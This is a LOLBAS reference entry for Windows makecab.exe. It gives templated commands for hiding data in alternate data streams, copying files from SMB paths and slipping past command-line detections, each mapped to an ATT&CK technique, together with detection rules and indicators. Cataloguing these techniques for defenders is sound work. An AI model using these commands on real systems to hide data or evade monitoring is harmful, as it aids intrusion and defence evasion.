---
title: "Makecab.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Makecab/
fetched_at: 2026-09-20T17:10:33Z
license: unspecified
category: windows
---

Binary to package existing files into a cabinet (.cab) file

## Paths
- C:\Windows\System32\makecab.exe
- C:\Windows\SysWOW64\makecab.exe

## Resources
- [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
- [https://ss64.com/nt/makecab-directives.html](https://ss64.com/nt/makecab-directives.html)
- [https://www.pearsonhighered.com/assets/samplechapter/0/7/8/9/0789728583.pdf](https://www.pearsonhighered.com/assets/samplechapter/0/7/8/9/0789728583.pdf)
- [https://learn.microsoft.com/en-us/previous-versions/bb417343(v=msdn.10)#makecab-application](https://learn.microsoft.com/en-us/previous-versions/bb417343(v=msdn.10)#makecab-application)

## Acknowledgements
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml)
- IOC: Makecab retrieving files from Internet
- IOC: Makecab storing data into alternate data streams

## Alternate data streams

1. Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

```
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
```

   - Use case: Hide data compressed into an alternate data stream

   - Privileges required: User

   - Operating systems: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

   - Tags: Type: Compression

2. Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

```
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
```

   - Use case: Hide data compressed into an alternate data stream

   - Privileges required: User

   - Operating systems: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

   - Tags: Type: Compression

3. Download and compresses the target file and stores it in the target file.

```
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
```

   - Use case: Download file and compress into a cab file

   - Privileges required: User

   - Operating systems: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Type: Compression

4. Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

```
makecab /F {PATH:.ddf}
```

   - Use case: Bypass command-line based detections

   - Privileges required: User

   - Operating systems: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1036

   - Tags: Type: Compression
